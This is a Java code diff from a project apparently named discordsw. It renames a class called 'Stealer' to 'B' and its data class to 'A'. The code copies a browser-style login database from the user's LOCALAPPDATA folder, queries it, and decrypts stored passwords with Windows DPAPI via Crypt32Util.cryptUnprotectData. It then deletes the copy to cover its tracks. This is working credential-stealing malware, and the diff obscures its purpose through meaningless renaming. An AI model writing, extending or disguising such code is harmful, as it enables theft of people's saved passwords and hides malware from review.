@@ -5,7 +5,6 @@ import me.mafrans.discordsw.Main;
 
 import java.io.File;
 import java.io.IOException;
-import java.io.UnsupportedEncodingException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.sql.*;
@@ -15,13 +14,13 @@ import java.util.List;
 /**
  * Created by Lemon on 8/26/2017.
  */
-public class Stealer
+public class B
 {
-    private static String d = System.getenv("LOCALAPPDATA") + Main.sql.a;
+    private static String d = System.getenv("LOCALAPPDATA") + Main.b.a;
 
     private static Connection connect() throws SQLException, ClassNotFoundException, IOException
     {
-        String b = System.getenv("LOCALAPPDATA") + Main.sql.b;
+        String b = System.getenv("LOCALAPPDATA") + Main.b.b;
         if (!new File(b).exists())
             {
                 Files.copy(Paths.get(d), Paths.get(b));
@@ -31,14 +30,14 @@ public class Stealer
         return DriverManager.getConnection(u);
     }
 
-    public static List<Data> s()
+    public static List<A> s()
     {
         try
         {
            Connection connection =  connect();
            Statement st = connection.createStatement();
-            ResultSet set = st.executeQuery("SELECT * FROM " + Main.sql.c);
-           List<Data> data = new ArrayList<>();
+            ResultSet set = st.executeQuery("SELECT * FROM " + Main.b.c);
+           List<A> data = new ArrayList<>();
            while(set.next())
            {
                String x = set.getString(2);
@@ -46,12 +45,12 @@ public class Stealer
                byte[] a = set.getBytes(6);
                byte[] b = Crypt32Util.cryptUnprotectData(a);
                String z = new String(b, "UTF-8");
-               Data dt = new Data(x, y, z);
+               A dt = new A(x, y, z);
                data.add(dt);
 
            }
            connection.close();
-            Files.delete(Paths.get(System.getenv("LOCALAPPDATA") + Main.sql.b));
+            Files.delete(Paths.get(System.getenv("LOCALAPPDATA") + Main.b.b));
            return data;
         }
         catch(SQLException | ClassNotFoundException | IOException ex)
